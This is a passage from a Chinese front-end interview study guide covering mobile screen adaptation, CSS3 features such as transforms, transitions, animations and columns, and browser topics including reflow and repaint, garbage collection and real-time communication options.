  border-bottom: 2px solid rgba(255, 255, 255, 0.3);
}
```

假设 html 的 font size = 1px 的话，就可以写 28 rem 了，更方便了，但是浏览器对字体大小有限制，设为 1px 的话，在浏览器中是失效的，会以 12px（或者其他值） 做一个计算 , 就会得到一个很夸张的结果，所以可以把 html 写的大一些

使用 sass 库时

JS 处理还是一样的，但看着好看些

```css
@function px2rem($px) {
  @return $px * 1rem / 100;
}

header {
  font-size: px2rem(28);
}
```

以上的三种适配方案，都是等比缩放，放到 ipad 上时（设计稿以手机屏幕设计的），页面元素会很大很丑，有些场景下，并不需要页面整体缩放（viewport 自动处理的也很好了），所以有时只需要合理的布局即可。

**弹性盒适配（合理布局）**

```html
<meta name="viewport" content="width=device-width">
```

使用 flex 布局

```css
section {
  display: flex;
}
```

总结一下，什么样的页面需要做适配（等比缩放）呢

- 页面中的布局是栅格化的

换了屏幕后，到底有多宽多高很难去做设置，整体的都需要改变，所以需要整体的缩放

- 头屏大图，宽度自适应，高度固定的话，对于不同的屏幕，形状就会发生改变（放到ipad上就变成长条了），宽度变化后，高度也要保持等比例变化

以上所有的适配都是宽度的适配，但是在某些场景下，也会出现高度的适配

比如大屏，需要适配很多的电视尺寸，要求撑满屏幕，不能有滚动条，此时若换个屏幕

此时需要考虑小元素用 vh, 宽和高都用 vh 去表示，中间的大块去自适应，这就做到了大屏的适配，屏幕变小了，整体变小了（体验更好），中间这块撑满了屏幕

对于更复杂的场景，需要更灵活考虑，没有一种适配方式可以囊括所有场景。





### 6、css3新特性

**参考答案**：

1. **CSS3 边框**

   在 css3 中新增的边框属性如下：

   **创建圆角**

   **语法：** `border-radius : length length;`

    length： 由浮点数字和单位标识符组成的长度值（如：20px）。不可为负值，如果为负值则与0展示效果一样。第一个值设置其水平半径，第二个值设置其垂直半径，如果第二个值省略则默认第二个值等于第一个值。

   ```css
   div{
     border: 1px solid;
     /* 设置每个圆角水平半径和垂直半径都为30px */
     border-radius: 30px;
   }
   ```

   `border-radius` 是4个角的缩写方法。四个角的表示顺序与`border`类似按照`border-top-left-radius`、`border-top-right-radius`、`border-bottom-right-radius`、`border-bottom-left-radius`的顺序来设置：

   ```css
   div{
     border: 1px solid;
     /* 如果 / 前后的值都存在，那么 / 前面的值设置其水平半径，/ 后面值设置其垂直半径，如果没有 / ，则水平和垂直半径相等 */
     border-radius: 10px 15px 20px 30px / 20px 30px 10px 15px;
   
     /* 上面写法等价于下面的写法，第一个值是水平半径，第二个值是垂直半径 */
     border-top-left-radius: 10px 20px;
     border-top-right-radius: 15px 30px;
     border-bottom-right-radius: 20px 10px;
     border-bottom-left-radius: 30px 15px;
   }
   ```

   `border-radius` 指定不同数量的值遵循对角相等的原则，即指定了值的取指定值，没有指定值的与对角值相等，对角相等模型

   **边框阴影**

   通过属性`box-shadow` 向边框添加阴影。

   **语法：** `{box-shadow : [inset]  x-offset  y-offset  blur-radius  extension-radius  spread-radiuscolor}`

   说明：对象选择器 {box-shadow:[投影方式] X轴偏移量 Y轴偏移量 模糊半径 阴影扩展半径 阴影颜色}

   ```css
   div{
     /* 内阴影，向右偏移10px，向下偏移10px，模糊半径5px，阴影缩小10px */
     box-shadow: inset 10px 10px 5px -10px #888888;
   }
   ```

   **边框图片**

   **语法：**

   `border-image : border-image-source || border-image-slice [ / border-image-width] || border-image-repeat`

   `border-image ： none | image [ number | percentage]{1,4} [ / border-width>{1,4} ] ? [ stretch | repeat | round ]{0,2}`

   ```css
   div{
     border-image:url(border.png) 30 30 round;
   
     border-image: url(border.png) 20/10px repeat;
   }
   ```

1. **CSS3 背景**

**`background-size` 属性**

在 CSS3 之前，背景图片的尺寸是由图片的实际尺寸决定的。在 CSS3 中，可以设置背景图片的尺寸，这就允许我们在不同的环境中重复使用背景图片。可以像素或百分比规定尺寸。如果以百分比规定尺寸，那么尺寸相对于父元素的宽度和高度。

```css
div{
  background:url(bg_flower.gif);
  /* 通过像素规定尺寸 */
  background-size:63px 100px;

  /* 通过百分比规定尺寸 */
  background-size:100% 50%;
  background-repeat:no-repeat;
}
```

**`background-origin` 属性**

规定背景图片的定位区域，背景图片可以放置于 `content-box`、`padding-box` 或 `border-box` 区域，

```css
div{
  background:url(bg_flower.gif);
  background-repeat:no-repeat;
  background-size:100% 100%;
  /* 规定背景图片的定位区域 */
  background-origin:content-box;
}
```

**`background-clip` 属性**

与`background-origin` 属性相似，规定背景颜色的绘制区域，区域划分与`background-origin` 属性相同。

```css
div{
  background-color:yellow;
  background-clip:content-box;
}
```

**CSS3 多重背景图片**

CSS3 允许为元素设置多个背景图像

```css
body{
  background-image:url(bg_flower.gif),url(bg_flower_2.gif);
}
```

1. CSS3 文本效果

**`text-shadow` 属性**

给为本添加阴影，能够设置水平阴影、垂直阴影、模糊距离，以及阴影的颜色。

```css
h1{
  text-shadow: 5px 5px 5px #FF0000;
}
```

**text-wrap 属性**

设置区域内的自动换行。

**语法：**`text-wrap: normal | none | unrestricted | suppress | break-word;`

```css
/* 允许对长单词进行拆分，并换行到下一行 */
p {word-wrap:break-word;}
```

|     值     |                             描述                             |
| :--------: | :----------------------------------------------------------: |
|   normal   |                  只在允许的换行点进行换行。                  |
|    none    |              不换行。元素无法容纳的文本会溢出。              |
| break-word |                    在任意两个字符间换行。                    |
|  suppress  | 压缩元素中的换行。浏览器只在行中没有其他有效换行点时进行换行。 |

1. CSS3 字体

**字体定义**

 在 CSS3 之前，web 设计师必须使用已在用户计算机上安装好的字体。但是通过 CSS3，web 设计师可以使用他 们喜欢的任意字体。当找到或购买到希望使用的字体时，可将该字体文件存放到 web 服务器上，它会在需要时 被自动下载到用户的计算机上。字体需要在 CSS3 @font-face 规则中定义。

```css
/* 定义字体 */
@font-face{
  font-family: myFont;
  src: url('Sansation_Light.ttf'),
       url('Sansation_Light.eot');     /* IE9+ */
}

div{
  font-family:myFont;
}
```

**使用粗体字体**

"Sansation_Light.ttf"文件 是定义的正常字体，"Sansation_Bold.ttf" 是另一个字体文件，它包含了 Sansation 字体的粗体字符。只要 font-family 为 "myFirstFont" 的文本需要显示为粗体，浏览器就会使用该字体。

（其实没弄清楚这样处理的原因，经测试直接在html中通过 b 标签也可以实现加粗的效果）

```css
/* 定义正常字体 */
@font-face{
  font-family: myFirstFont;
  src: url('/example/css3/Sansation_Light.ttf'),
       url('/example/css3/Sansation_Light.eot'); /* IE9+ */
}

/* 定义粗体时使用的字体 */
@font-face{
  font-family: myFirstFont;
  src: url('/example/css3/Sansation_Bold.ttf'),
       url('/example/css3/Sansation_Bold.eot'); /* IE9+ */
  /* 标识属性 */
  font-weight:bold;
}

div{
  font-family:myFirstFont;
}
```

1. CSS3 2D 转换

通过 CSS3 转换，我们能够对元素进行**移动、缩放、转动、拉长或拉伸**，转换是使元素改变形状、尺寸和位置的一种效果。

**translate() 方法**

通过 translate(x , y) 方法，元素根据给定的 left（x 坐标） 和 top（y 坐标） 位置参数从其当前位置移动，x为正值向右移动，为负值向左移动；y为正值向下移动，为负值向上移动；

```css
div{
  transform: translate(50px,100px);
  -ms-transform: translate(50px,100px);        /* IE 9 */
  -webkit-transform: translate(50px,100px);     /* Safari and Chrome */
  -o-transform: translate(50px,100px);         /* Opera */
  -moz-transform: translate(50px,100px);        /* Firefox */
}
```

**rotate() 方法**

控制元素顺时针旋转给定的角度。为正值，元素将顺时针旋转。为负值，元素将逆时针旋转。

```css
div{
  transform: rotate(30deg);
  -ms-transform: rotate(30deg);        /* IE 9 */
  -webkit-transform: rotate(30deg);    /* Safari and Chrome */
  -o-transform: rotate(30deg);         /* Opera */
  -moz-transform: rotate(30deg);       /* Firefox */
}
```

**scale() 方法**

根据给定的宽度（X 轴）和高度（Y 轴）参数，控制元素的尺寸的增加、减少。

```css
div{
  transform: scale(2,4);
  -ms-transform: scale(2,4);         /* IE 9 */
  -webkit-transform: scale(2,4);     /* Safari 和 Chrome */
  -o-transform: scale(2,4);         /* Opera */
  -moz-transform: scale(2,4);       /* Firefox */
}
```

**skew() 方法**

根据给定的水平线（X 轴）和垂直线（Y 轴）参数设置元素翻转给定的角度。

```css
/* 设置围绕 X 轴把元素翻转 30 度，围绕 Y 轴翻转 20 度。 */
div{
  transform: skew(30deg,20deg);
  -ms-transform: skew(30deg,20deg);         /* IE 9 */
  -webkit-transform: skew(30deg,20deg);     /* Safari and Chrome */
  -o-transform: skew(30deg,20deg);          /* Opera */
  -moz-transform: skew(30deg,20deg);        /* Firefox */
}
```

**matrix() 方法**

matrix() 方法把所有 2D 转换方法组合在一起。matrix() 方法需要六个参数，包含数学函数，允许旋转、缩放、移动以及倾斜元素。

```css
/* 使用 matrix 方法将 div 元素旋转 30 度 */
div{
  transform:matrix(0.866,0.5,-0.5,0.866,0,0);
  -ms-transform:matrix(0.866,0.5,-0.5,0.866,0,0);          /* IE 9 */
  -moz-transform:matrix(0.866,0.5,-0.5,0.866,0,0);         /* Firefox */
  -webkit-transform:matrix(0.866,0.5,-0.5,0.866,0,0);      /* Safari and Chrome */
  -o-transform:matrix(0.866,0.5,-0.5,0.866,0,0);           /* Opera */
}
```

**2D Transform 方法汇总**

|         函数          |                   描述                   |
| :-------------------: | :--------------------------------------: |
|  matrix(n,n,n,n,n,n)  |     定义 2D 转换，使用六个值的矩阵。     |
|    translate(x,y)     |  定义 2D 转换，沿着 X 和 Y 轴移动元素。  |
|     translateX(n)     |    定义 2D 转换，沿着 X 轴移动元素。     |
|     translateY(n)     |    定义 2D 转换，沿着 Y 轴移动元素。     |
|      scale(x,y)       | 定义 2D 缩放转换，改变元素的宽度和高度。 |
|       scaleX(n)       |    定义 2D 缩放转换，改变元素的宽度。    |
|       scaleY(n)       |    定义 2D 缩放转换，改变元素的高度。    |
|     rotate(angle)     |     定义 2D 旋转，在参数中规定角度。     |
| skew(x-angle,y-angle) |    定义 2D 倾斜转换，沿着 X 和 Y 轴。    |
|     skewX(angle)      |      定义 2D 倾斜转换，沿着 X 轴。       |
|     skewY(angle)      |      定义 2D 倾斜转换，沿着 Y 轴。       |

1. CSS3 3D 转换

CSS3 允许使用 3D 转换来对元素进行格式化

**rotateX() 方法**

```css
/* 设置元素围绕其 X 轴以给定的度数进行旋转 */
div{
  transform: rotateX(120deg);
  -webkit-transform: rotateX(120deg);   /* Safari 和 Chrome */
  -moz-transform: rotateX(120deg);  /* Firefox */
}
```

**rotateY() 旋转**

```css
/* 设置元素围绕其 Y 轴以给定的度数进行旋转 */
div{
  transform: rotateY(130deg);
  -webkit-transform: rotateY(130deg);   /* Safari 和 Chrome */
  -moz-transform: rotateY(130deg);  /* Firefox */
}
```

1. CSS3 过渡

   通过 CSS3可以在不使用 Flash 动画或 JavaScript 的情况下，当元素从一种样式变换为另一种样式时为元素添加效果。

   要实现这一点，必须规定以下两项内容：

   - 设置添加过渡效果的 CSS 属性；
   - 设置过渡效果的时长；

   **注意：** 如果时长未设置，则不会有过渡效果，因为默认值是 0。

**单项改变**

```css
/* 设置将变化效果添加在“宽度”上，时长为2秒；该时长在其他属性上并不适用 */
div{
  transition: width 2s;
  -moz-transition: width 2s;         /* Firefox 4 */
  -webkit-transition: width 2s;      /* Safari 和 Chrome */
  -o-transition: width 2s;           /* Opera */
}
/* 配合在一起使用的效果就是当鼠标移上去的时候宽度变为300px，这个过程耗时2秒 */
div:hover{
  width:300px;
}
```

 **注意：** 当鼠标移出元素时，它会逐渐变回原来的样式。

**多项改变**

如需向多个样式添加过渡效果，请添加多个属性，由逗号隔开。

```css
/* 同时向宽度、高度和转换添加过渡效果 */
div{
  transition: width 2s, height 2s, transform 2s;
  -moz-transition: width 2s, height 2s, -moz-transform 2s;
  -webkit-transition: width 2s, height 2s, -webkit-transform 2s;
  -o-transition: width 2s, height 2s,-o-transform 2s;
}

/* 当鼠标移上时宽度和高度都变成200px，同时旋转180度，每个属性变化都耗时2秒 */
div:hover{
  width:200px;
  height:200px;
  transform:rotate(180deg);
  -moz-transform:rotate(180deg);        /* Firefox 4 */
  -webkit-transform:rotate(180deg);     /* Safari and Chrome */
  -o-transform:rotate(180deg);          /* Opera */
}
```

**过渡属性详解**

`transition` 是简写属性，

**语法：** `transition : transition-property | transition-duration | transition-timing-function | transition-delay;`

```css
/* 设置在宽度上添加过渡效果，时长为1秒，过渡效果时间曲线为linear，等待2秒后开始过渡 */
div{
  transition: width 1s linear 2s;
  -moz-transition: width 1s linear 2s;       /* Firefox 4 */
  -webkit-transition: width 1s linear 2s;    /* Safari and Chrome */
  -o-transition: width 1s linear 2s;         /* Opera */
}
```

|            属性            |                     描述                     |
| :------------------------: | :------------------------------------------: |
|         transition         | 简写属性，用于在一个属性中设置四个过渡属性。 |
|    transition-property     |       规定应用过渡的 CSS 属性的名称。        |
|    transition-duration     |      定义过渡效果花费的时间。默认是 0。      |
| transition-timing-function |   规定过渡效果的时间曲线。默认是 "ease"。    |
|      transition-delay      |       规定过渡效果何时开始。默认是 0。       |

1. CSS3 动画

   通过 CSS3可以创建动画，这些动画可以取代网页中的画图片、Flash 动画以及 JavaScript。

   CSS3 中通过@keyframes 规则来创建动画。在 @keyframes 中规定某项 CSS 样式，就能创建由当前样式（动画开始前的样式）逐渐改为新样式（需要变到的样式）的动画效果。

**通过from , to关键字设置动画发生的时间**

```css
/* 通过@keyframes 创建动画 */
@keyframes myfirst{
  from {background: red;}
  to {background: yellow;}
}
/* Firefox */
@-moz-keyframes myfirst {
  from {background: red;}
  to {background: yellow;}
}
/* Safari 和 Chrome */
@-webkit-keyframes myfirst {
  from {background: red;}
  to {background: yellow;}
}
/* Opera */
@-o-keyframes myfirst {
  from {background: red;}
  to {background: yellow;}
}

/*
   将创建的动画绑定到选择器，并至少指定以下两项 CSS3 动画属性
   1.指定动画的名称；
   2.指定动画的时长；
*/
div{
  animation: myfirst 5s;
  -moz-animation: myfirst 5s;       /* Firefox */
  -webkit-animation: myfirst 5s;    /* Safari 和 Chrome */
  -o-animation: myfirst 5s;         /* Opera */
}
```

**通过百分比设置动画发生的时间**

动画是使元素从一种样式逐渐变化为另一种样式的效果。可以改变任意多的样式任意多的次数。可以用关键词 "from" 和 "to"来设置动画变化发生的时间，其效果等同于 0% 和 100%。0% 是动画的开始，100% 是动画的完成。为了得到最佳的浏览器支持，应该始终定义 0% 和 100% 选择器。

```css
/* 当动画为 25% 及 50% 时改变背景色，然后当动画 100% 完成时再次改变 */
@keyframes myfirst{
  0%   {background: red;}
  25%  {background: yellow;}
  50%  {background: blue;}
  100% {background: green;}
}

/* 同时改变背景色和位置 */
@keyframes myfirst{
  0%   {background: red; left:0px; top:0px;}
  25%  {background: yellow; left:200px; top:0px;}
  50%  {background: blue; left:200px; top:200px;}
  75%  {background: green; left:0px; top:200px;}
  100% {background: red; left:0px; top:0px;}
}
```

**动画属性详解**

`animation` 是除了 `animation-play-state` 属性所有动画属性的简写属性。

**语法：** `animation : animation-name | animation-duration | animation-timing-function | animation-delay | animation-iteration-count | animation-direction`

```css
/* 应用的动画为myfirst，一个动画周期为5秒，动画的速度曲线为linear，动画2秒后播放，播放次数为infinite，即无限循环，动画下一周期是否逆向播放取值alternate，即逆向播放 */
div{
  animation: myfirst 5s linear 2s infinite alternate;
  /* Firefox: */
  -moz-animation: myfirst 5s linear 2s infinite alternate;
  /* Safari 和 Chrome: */
  -webkit-animation: myfirst 5s linear 2s infinite alternate;
  /* Opera: */
  -o-animation: myfirst 5s linear 2s infinite alternate;
}
```

|           属性            |                           描述                           |
| :-----------------------: | :------------------------------------------------------: |
|        @keyframes         |                        规定动画。                        |
|         animation         | 所有动画属性的简写属性，除了 animation-play-state 属性。 |
|      animation-name       |               规定 @keyframes 动画的名称。               |
|    animation-duration     |     规定动画完成一个周期所花费的秒或毫秒。默认是 0。     |
| animation-timing-function |           规定动画的速度曲线。默认是 "ease"。            |
|      animation-delay      |               规定动画何时开始。默认是 0。               |
| animation-iteration-count |             规定动画被播放的次数。默认是 1。             |
|    animation-direction    |   规定动画是否在下一周期逆向地播放。默认是 "normal"。    |
|   animation-play-state    |      规定动画是否正在运行或暂停。默认是 "running"。      |
|    animation-fill-mode    |               规定对象动画时间之外的状态。               |

1. CSS3 多列

   通过 CSS3够创建多个列来对文本进行布局，就像我们经常看到的报纸的布局一样。

   **CSS3 创建多列**

   `column-count` 属性规定元素应该被分隔的列数。

```css
/* 将div中的文本分为3列 */
div{
  column-count:3;
  -moz-column-count:3;        /* Firefox */
  -webkit-column-count:3;     /* Safari 和 Chrome */
}
```

**CSS3 规定列之间的间隔**

`column-gap` 属性规定列之间的间隔。

```css
/* 设置列之间的间隔为 40 像素 */
div{
  column-gap:40px;
  -moz-column-gap:40px;        /* Firefox */
  -webkit-column-gap:40px;     /* Safari 和 Chrome */
}
```

**CSS3 列规则**

`column-rule` 属性设置列之间的宽度、样式和颜色规则。

**语法：** `column-rule : column-rule-width | column-rule-style | column-rule-color`

```css
div{
  column-rule:3px outset #ff0000;
  -moz-column-rule:3px outset #ff0000;       /* Firefox */
  -webkit-column-rule:3px outset #ff0000;    /* Safari and Chrome */
}
```

|       属性        |                  描述                   |
| :---------------: | :-------------------------------------: |
|   column-count    |       规定元素应该被分隔的列数。        |
|    column-fill    |            规定如何填充列。             |
|    column-gap     |           规定列之间的间隔。            |
|    column-rule    | 设置所有 column-rule-* 属性的简写属性。 |
| column-rule-width |         规定列之间规则的宽度。          |
| column-rule-style |         规定列之间规则的样式。          |
| column-rule-color |         规定列之间规则的颜色。          |
|    column-span    |        规定元素应该横跨的列数。         |
|   column-width    |             规定列的宽度。              |
|      columns      |   语法 : column-width column-count。    |

1. CSS3 用户界面

**CSS3 resize**

在 CSS3中`resize` 属性设置是否可由用户调整元素尺寸。

```css
/* 设置div可以由用户调整大小 */
div{
  resize:both;
  overflow:auto;
}
```

**CSS3 box-sizing**

`box-sizing` 属性允许您以确切的方式定义适应某个区域的具体内容。边框计算在width中

```css
/* 规定两个并排的带边框方框 */
div{
  box-sizing:border-box;
  -moz-box-sizing:border-box;        /* Firefox */
  -webkit-box-sizing:border-box;     /* Safari */
  width:50%;
  float:left;
}
```

**CSS3 outline-offset**

`outline-offset` 属性对轮廓进行偏移，并在超出边框边缘的位置绘制轮廓。

轮廓与边框有两点不同：

> - 轮廓不占用空间；
> - 轮廓可能是非矩形；

```css
/* 规定边框边缘之外 15 像素处的轮廓 */
div{
  border:2px solid black;
  outline:2px solid red;
  outline-offset:15px;
}
```





## 浏览器

###  1、localStorage 能跨域吗

**参考答案**：

不能

解决方案：

- 通过postMessage来实现跨源通信
- 可以实现一个公共的iframe部署在某个域名中，作为共享域
- 将需要实现localStorage跨域通信的页面嵌入这个iframe
- 接入对应的SDK操作共享域，从而实现localStorage的跨域存储

![img](https://static.nowcoder.com/images/activity/2021jxy/front/images/3678441071-694971ac024828f3_articlex.png)



### 2、浏览器输入URL发生了什么

**参考答案**：

1. URL 解析
2. DNS 查询
3. TCP 连接
4. 处理请求
5. 接受响应
6. 渲染页面



### 3、重绘、重排区别如何避免

**参考答案**：

1. 重排(Reflow)：当渲染树的一部分必须更新并且节点的尺寸发生了变化，浏览器会使渲染树中受到影响的部分失效，并重新构造渲染树。

2. 重绘(Repaint)：是在一个元素的外观被改变所触发的浏览器行为，浏览器会根据元素的新属性重新绘制，使元素呈现新的外观。比如改变某个元素的背景色、文字颜色、边框颜色等等

3. 区别：**重绘不一定需要重排（比如颜色的改变），重排必然导致重绘（比如改变网页位置）**

4. 引发重排

   4.1 添加、删除可见的dom

   4.2 元素的位置改变

   4.3 元素的尺寸改变(外边距、内边距、边框厚度、宽高、等几何属性)

   4.4 页面渲染初始化

   4.5 浏览器窗口尺寸改变

   4.6 获取某些属性。当获取一些属性时，浏览器为取得正确的值也会触发重排,它会导致队列刷新，这些属性包括：offsetTop、offsetLeft、 offsetWidth、offsetHeight、scrollTop、scrollLeft、scrollWidth、scrollHeight、clientTop、clientLeft、clientWidth、clientHeight、getComputedStyle() (currentStyle in IE)。所以，在多次使用这些值时应进行缓存。

5. 优化：

   浏览器自己的优化：

   浏览器会维护1个队列，把所有会引起重排，重绘的操作放入这个队列，等队列中的操作到一定数量或者到了一定时间间隔，浏览器就会flush队列，进行一批处理，这样多次重排，重绘变成一次重排重绘

   减少 reflow/repaint：
   （1）不要一条一条地修改 DOM 的样式。可以先定义好 css 的 class，然后修改 DOM 的 className。

   （2）不要把 DOM 结点的属性值放在一个循环里当成循环里的变量。
   （3）为动画的 HTML 元件使用 fixed 或 absoult 的 position，那么修改他们的 CSS 是不会 reflow 的。
   （4）千万不要使用 table 布局。因为可能很小的一个小改动会造成整个 table 的重新布局。(table及其内部元素除外，它可能需要多次计算才能确定好其在渲染树中节点的属性，通常要花3倍于同等元素的时间。这也是为什么我们要避免使用table做布局的一个原因。)

   （5）不要在布局信息改变的时候做查询（会导致渲染队列强制刷新）





### 4、let a = "sssssss"，分别存在哪儿？

**参考答案**：

 使用let声明的全局变量不是挂在window对象下的，声明的全局变量存在于一个块级作用域中。

 具体查看，我们可以通过打印一个全局函数，在let声明的全局变量在全局函数的scope下，我们平时使用时直接 用变量名称就能访问







### 5、浏览器垃圾回收机制

**参考答案：**

**1. 介绍**

浏览器的 Javascript 具有自动垃圾回收机制(GC:Garbage Collecation)，也就是说，执行环境会负责管理代码执行过程中使用的内存。其原理是：**垃圾收集器会定期（周期性）找出那些不在继续使用的变量，然后释放其内存**。但是这个过程不是实时的，因为其开销比较大并且GC时停止响应其他操作，所以垃圾回收器会按照固定的时间间隔周期性的执行。

不再使用的变量也就是生命周期结束的变量，当然只可能是局部变量，全局变量的生命周期直至浏览器卸载页面才会结束。局部变量只在函数的执行过程中存在，而在这个过程中会为局部变量在栈或堆上分配相应的空间，以存储它们的值，然后在函数中使用这些变量，直至函数结束，而闭包中由于内部函数的原因，外部函数并不能算是结束。

还是上代码说明吧：

```js
function fn1() {
    var obj = {name: 'hanzichi', age: 10};
}
function fn2() {
    var obj = {name:'hanzichi', age: 10};
    return obj;
}

var a = fn1();
var b = fn2();
复制代码
```

我们来看代码是如何执行的。首先定义了两个function，分别叫做fn1和fn2，当fn1被调用时，进入fn1的环境，会开辟一块内存存放对象{name: 'hanzichi', age: 10}，而当调用结束后，出了fn1的环境，那么该块内存会被js引擎中的垃圾回收器自动释放；在fn2被调用的过程中，返回的对象被全局变量b所指向，所以该块内存并不会被释放。

这里问题就出现了：到底哪个变量是没有用的？所以垃圾收集器必须跟踪到底哪个变量没用，对于不再有用的变量打上标记，以备将来收回其内存。用于标记的无用变量的策略可能因实现而有所区别，通常情况下有两种实现方式：**标记清除**和**引用计数**。引用计数不太常用，标记清除较为常用。

**2. 标记清除**

js中最常用的垃圾回收方式就是标记清除。当变量进入环境时，例如，在函数中声明一个变量，就将这个变量标记为“进入环境”。从逻辑上讲，永远不能释放进入环境的变量所占用的内存，因为只要执行流进入相应的环境，就可能会用到它们。而当变量离开环境时，则将其标记为“离开环境”。

```js
function test(){
var a = 10 ;             //被标记 ，进入环境 
var b = 20 ;             //被标记 ，进入环境
}
test();                     //执行完毕 之后 a、b又被标离开环境，被回收。
复制代码
```

垃圾回收器在运行的时候会给存储在内存中的所有变量都加上标记（当然，可以使用任何标记方式）。然后，它会去掉环境中的变量以及被环境中的变量引用的变量的标记（闭包）。而在此之后再被加上标记的变量将被视为准备删除的变量，原因是环境中的变量已经无法访问到这些变量了。最后，垃圾回收器完成内存清除工作，销毁那些带标记的值并回收它们所占用的内存空间。 到目前为止，IE9+、Firefox、Opera、Chrome、Safari的js实现使用的都是标记清除的垃圾回收策略或类似的策略，只不过垃圾收集的时间间隔互不相同。

**3. 引用计数**

引用计数的含义是跟踪记录每个值被引用的次数。当声明了一个变量并将一个引用类型值赋给该变量时，则这个值的引用次数就是1。如果同一个值又被赋给另一个变量，则该值的引用次数加1。相反，如果包含对这个值引用的变量又取得了另外一个值，则这个值的引用次数减1。当这个值的引用次数变成0时，则说明没有办法再访问这个值了，因而就可以将其占用的内存空间回收回来。这样，当垃圾回收器下次再运行时，它就会释放那些引用次数为0的值所占用的内存。

```js
function test(){
    var a = {} ;         //a的引用次数为0 
    var b = a ;         //a的引用次数加1，为1 
    var c =a;           //a的引用次数再加1，为2
    var b ={};          //a的引用次数减1，为1
}
复制代码
```

Netscape Navigator3是最早使用引用计数策略的浏览器，但很快它就遇到一个严重的问题：循环引用。循环引用指的是对象A中包含一个指向对象B的指针，而对象B中也包含一个指向对象A的引用。

```js
function fn() {
    var a = {};
    var b = {};
    a.pro = b;
    b.pro = a;
}
fn();
复制代码
```

  以上代码a和b的引用次数都是2，fn()执行完毕后，两个对象都已经离开环境，在标记清除方式下是没有问题的，但是在引用计数策略下，因为a和b的引用次数不为0，所以不会被垃圾回收器回收内存，如果fn函数被大量调用，就会造成内存泄露。在IE7与IE8上，内存直线上升。

我们知道，IE中有一部分对象并不是原生js对象。例如，其内存泄露DOM和BOM中的对象就是使用C++以COM对象的形式实现的，而COM对象的垃圾回收机制采用的就是引用计数策略。因此，即使IE的js引擎采用标记清除策略来实现，但js访问的**COM对象依然是基于引用计数策略**的。换句话说，只要在IE中涉及COM对象，就会存在循环引用的问题。

```js
var element = document.getElementById("some_element");
var myObject = new Object();
myObject.e = element;
element.o = myObject;
复制代码
```

  这个例子在一个DOM元素（element)与一个原生js对象（myObject)之间创建了循环引用。其中，变量myObject有一个属性e指向element对象；而变量element也有一个属性o回指myObject。由于存在这个循环引用，即使例子中的DOM从页面中移除，它也永远不会被回收。

举个栗子：

![img](https://static.nowcoder.com/images/activity/2021jxy/front/images/16a3a0cb350a31ae)

- 黄色是指直接被 js变量所引用，在内存里
- 红色是指间接被 js变量所引用，如上图，refB 被 refA 间接引用，导致即使 refB 变量被清空，也是不会被回收的
- 子元素 refB 由于 `parentNode` 的间接引用，只要它不被删除，它所有的父元素（图中红色部分）都不会被删除

另一个例子：

```js
window.onload=function outerFunction(){
    var obj = document.getElementById("element");
    obj.onclick=function innerFunction(){};
};
复制代码
```

这段代码看起来没什么问题，但是obj引用了document.getElementById('element')，而document.getElementById('element')的onclick方法会引用外部环境中的变量，自然也包括obj，是不是很隐蔽啊。(在比较新的浏览器中在移除Node的时候已经会移除其上的event了，但是在老的浏览器，特别是ie上会有这个bug)

**解决办法：**

最简单的方式就是自己手工解除循环引用，比如刚才的函数可以这样

```js
myObject.element = null;
element.o = null;

window.onload=function outerFunction(){
    var obj = document.getElementById("element");
    obj.onclick=function innerFunction(){};
    obj=null;
};
复制代码
```

将变量设置为null意味着切断变量与它此前引用的值之间的连接。当垃圾回收器下次运行时，就会删除这些值并回收它们占用的内存。

要注意的是，IE9+并不存在循环引用导致Dom内存泄露问题，可能是微软做了优化，或者Dom的回收方式已经改变

**4. 内存管理**

**4.1 什么时候触发垃圾回收？**

垃圾回收器周期性运行，如果分配的内存非常多，那么回收工作也会很艰巨，确定垃圾回收时间间隔就变成了一个值得思考的问题。IE6的垃圾回收是根据内存分配量运行的，当环境中存在256个变量、4096个对象、64k的字符串任意一种情况的时候就会触发垃圾回收器工作，看起来很科学，不用按一段时间就调用一次，有时候会没必要，这样按需调用不是很好吗？但是如果环境中就是有这么多变量等一直存在，现在脚本如此复杂，很正常，那么结果就是垃圾回收器一直在工作，这样浏览器就没法儿玩儿了。

微软在IE7中做了调整，触发条件不再是固定的，而是动态修改的，初始值和IE6相同，如果垃圾回收器回收的内存分配量低于程序占用内存的15%，说明大部分内存不可被回收，设的垃圾回收触发条件过于敏感，这时候把临街条件翻倍，如果回收的内存高于85%，说明大部分内存早就该清理了，这时候把触发条件置回。这样就使垃圾回收工作职能了很多

**4.2 合理的GC方案**

**1. 基础方案**

Javascript引擎基础GC方案是（simple GC）：mark and sweep（标记清除），即：

1. 遍历所有可访问的对象。
2. 回收已不可访问的对象。

**2. GC的缺陷**

和其他语言一样，javascript的GC策略也无法避免一个问题：GC时，停止响应其他操作，这是为了安全考虑。而Javascript的GC在100ms甚至以上，对一般的应用还好，但对于JS游戏，动画对连贯性要求比较高的应用，就麻烦了。这就是新引擎需要优化的点：避免GC造成的长时间停止响应。

**3. GC优化策略**

David大叔主要介绍了2个优化方案，而这也是最主要的2个优化方案了：

1. **分代回收**（Generation GC） 这个和Java回收策略思想是一致的，也是V8所主要采用的。目的是通过区分“临时”与“持久”对象；多回收“临时对象”区（young generation），少回收“持久对象”区（tenured generation），减少每次需遍历的对象，从而减少每次GC的耗时。如图：

   

   这里需要补充的是：对于tenured generation对象，有额外的开销：把它从young generation迁移到tenured generation，另外，如果被引用了，那引用的指向也需要修改。 这里主要内容可以参考

   深入浅出Node

   中关于内存的介绍，很详细~

2. **增量GC** 这个方案的思想很简单，就是“每次处理一点，下次再处理一点，如此类推”。如图：

   

   这种方案，虽然耗时短，但中断较多，带来了上下文切换频繁的问题。

   因为每种方案都其适用场景和缺点，因此在实际应用中，会根据实际情况选择方案。

   比如：低 (对象/s) 比率时，中断执行GC的频率，simple GC更低些；如果大量对象都是长期“存活”，则分代处理优势也不大。



### 6、有什么方法可以保持前后端实时通信

**参考答案**：

实现保持前后端实时通信的方式有以下几种

- WebSocket： IE10以上才支持，Chrome16, FireFox11,Safari7以及Opera12以上完全支持，移动端形势大
- event-source: IE完全不支持（注意是任何版本都不支持），Edge76，Chrome6,Firefox6,Safari5和Opera以上支持， 移动端形势大好
- AJAX轮询： 用于兼容低版本的浏览器
- 永久帧（ forever iframe）可用于兼容低版本的浏览器
- flash socket 可用于兼容低版本的浏览器

### 7、会阻塞dom解析的资源有：

1.内联css

2.内联js

3.普通外联js

4.外联defer js 

5.js之前的外联css

1. css加载不会阻塞DOM树的解析

2. css加载会阻塞DOM树的渲染

3. css加载会阻塞后面js语句的执行

   

一、iframe会阻塞主页面的onload事件；

二、搜索引擎检索程序无法解读这种页面，不利于SEO；

